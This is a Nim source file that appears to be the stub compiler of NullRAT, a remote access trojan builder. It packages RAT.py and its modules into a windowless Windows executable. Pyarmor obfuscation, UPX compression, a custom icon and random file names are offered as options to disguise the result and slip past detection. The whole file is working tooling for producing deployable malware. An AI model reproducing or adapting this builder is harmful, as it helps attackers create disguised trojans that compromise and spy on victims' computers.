import std/terminal
import std/os
import std/osproc
import std/random
import std/envvars
import std/[strutils, strformat]

from utils import cleanWorkingDir, printName, runInVenv

proc compiler*(): int = 
    printName()
    var appDirectory = getAppDir()
    setCurrentDir(appDirectory / "NullRAT")
    
    let venvPath = appDirectory / "NullRAT" / "NR_VENV"
    stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")

    echo ""
    var obfuscate: bool
    var compress: bool
    var icon: bool = false
    var iconPath: string = "None"

    # Check Python version, pyarmor no longer supports 3.11+
    var status = execProcess("python --version")
    for i in ["3.11", "3.12", "3.13", "3.14"]:
        if i in status: 
            echo "Python ", i, " is not supported!\n - Pyarmor only supports max python version of 3.10\n - Uninstall Python and run this program again to auto-download the correct version!"
            sleep(5000)
            quit(0)

    stdout.styledWriteLine({styleBright}, "Do you want to obfuscate the executable? (Y/n)")
    var input: char = getch()
    if input == 'N' or input == 'n': 
        obfuscate = false
    elif input == 'Q' or input == 'q': 
        return 0
    else: 
        obfuscate = true
    
    stdout.styledWriteLine({styleBright}, "Do you want to compress the executable? (Y/n)")
    input = getch()
    if input == 'N' or input == 'n': 
        compress = false
    elif input == 'Q' or input == 'q': 
        return 0
    else: 
        compress = true
    
    stdout.styledWriteLine({styleBright}, "Do you want to set a custom icon? (y/N)")
    input = getch()
    
    if input == 'Y' or input == 'y': 
        icon = true
        echo "Drag and drop .ico file here, and press ENTER..."
        echo "(Or type it's full path)"
        iconPath = readLine(stdin)
        iconPath = iconPath.strip()
        while fileExists(iconPath) == false:
            echo "Icon file not found! Please try again."
            iconPath = readLine(stdin)
            iconPath = iconPath.strip()
    if input == 'Q' or input == 'q': 
        return 0

    echo "All options selected: "
    echo "---------------------"
    if obfuscate: 
        echo "Executable will be obfuscated (w/ pyarmor)"
    if compress:
        var path = getEnv("path")
        if path[^1] == ';':
            putEnv("path", fmt"{path}{appDirectory}\NullRAT\upx;")
        else:
            putEnv("path", fmt"{path};{appDirectory}\NullRAT\upx;")
        echo "Executable will be compressed (w/ upx)"
    if icon: 
        echo "Executable will have custom icon"
        echo "Path: ", iconPath
    echo ""

    stdout.styledWriteLine(fgRed, {styleBright}, "Would you like to compile now? (Y/n)")
    input = getch()
    printName()
    if input == 'N' or input == 'n':
        echo "- User declined request. Aborting..."
        sleep(1500)
        return 0
    elif input == 'Q' or input == 'q': 
        return 0
    else:
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Compiling using selected settings...")
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Creating tempdir...")
        var folderName = "compiling-" & $rand(6969)
        createDir(folderName)

        setCurrentDir(appDirectory / "NullRAT" / folderName)
        var currentDirectory = getCurrentDir()
        echo currentDirectory
        
        echo appDirectory / "NullRAT" / "RAT.py"
        copyFile(appDirectory / "NullRAT" / "RAT.py", currentDirectory / "RAT.py")
        echo appDirectory / "NullRAT" / "Variables.py"
        copyFile(appDirectory / "NullRAT" / "Variables.py", currentDirectory / "Variables.py")
        if icon:
            copyFile(iconPath, currentDirectory / "custom_icon.ico")
            
        var modules: seq[string]
        for path in walkDir(appDirectory / "NullRAT" / "modules"):
            if "create_new" in $path.path.split("\\")[^1]:
                continue
            echo $path.path
            copyFile($path.path, currentDirectory / $path.path.split("\\")[^1])
            modules.add($path.path.split("\\")[^1])

        var pyinst_cmd = "pyinstaller --onefile --noconsole --hidden-import mss"
        
        var dat: string 
        if obfuscate:
            dat = fmt" --add-data 'Variables.py;.'"
        else:
            dat = fmt" --add-data ""Variables.py;."""
            pyinst_cmd.add(dat)
        
        var pyarmor_cmd: string = "pyarmor-7" & fmt" pack --clean -e "" --onefile --noconsole --hidden-import mss {dat}"
        if icon:
            if obfuscate:
                pyarmor_cmd = "pyarmor-7" & fmt" pack --clean -e "" --onefile --noconsole --icon=custom_icon.ico --hidden-import mss {dat}"""
            else:
                pyinst_cmd = pyinst_cmd & " --icon=custom_icon.ico"

        pyarmor_cmd.add(dat)

        if obfuscate:
            for m in modules:
                dat = fmt" --add-data '{m};.'"
                pyarmor_cmd.add(dat)
        else:
            for m in modules:
                dat = fmt" --add-data ""{m};."""
                pyinst_cmd.add(dat)

        let 
            randomString = $rand(1337)
            obPyName = randomString & ".py"
            obFileName = randomString & ".exe"

        moveFile(currentDirectory / "RAT.py", currentDirectory / obPyName)
            
        pyinst_cmd.add(" " & obPyName)
        pyarmor_cmd.add(fmt"""" {obPyName}""")
        
        discard execShellCmd("color C")
        if obfuscate: 
            echo pyarmor_cmd
            discard runInVenv(venvPath, pyarmor_cmd)
        else: 
            echo pyinst_cmd
            discard runInVenv(venvPath, pyinst_cmd)
        
        var name = $rand(6969) & ".exe"
        if fileExists(currentDirectory / "dist" / obFileName):
            moveFile(currentDirectory / "dist" / obFileName, appDirectory / name)
        setCurrentDir(appDirectory / "NullRAT")
        removeDir(folderName)
        
        stdout.styledWriteLine(fgGreen, {styleBright},  "Build Successful! Output in " & name)
        echo "Press any key to exit..."
        discard getch()
        quit(0)